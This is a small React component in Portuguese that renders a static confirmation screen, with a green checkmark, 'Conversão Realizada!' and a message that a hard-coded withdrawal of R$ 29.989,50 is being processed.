import '../styles/app.css';

const Up6 = () => {
  return (
    <main style={{ backgroundColor: '#f5f5f5', minHeight: '100vh', paddingBottom: '40px' }}>
      <div className="title">Processando</div>

      <div style={{
        backgroundColor: '#fff',
        borderRadius: '12px',
        margin: '0 12px',
        padding: '40px 20px',
        textAlign: 'center',
        fontFamily: 'Inter, system-ui, sans-serif',
      }}>
        <div style={{
          width: '60px',
          height: '60px',
          borderRadius: '50%',
          backgroundColor: '#22c55e',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          margin: '0 auto 20px',
        }}>
          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
            <polyline points="20 6 9 17 4 12"></polyline>
          </svg>
        </div>

        <h1 style={{
          fontSize: '20px',
          fontWeight: 700,
          color: '#000',
          margin: '0 0 12px',
        }}>
          Conversão Realizada!
        </h1>

        <p style={{
          fontSize: '14px',
          color: '#666',
          margin: 0,
          lineHeight: 1.5,
        }}>
          Seu saque de R$ 29.989,50 está sendo processado.
        </p>
      </div>
    </main>
  );
};

export default Up6;
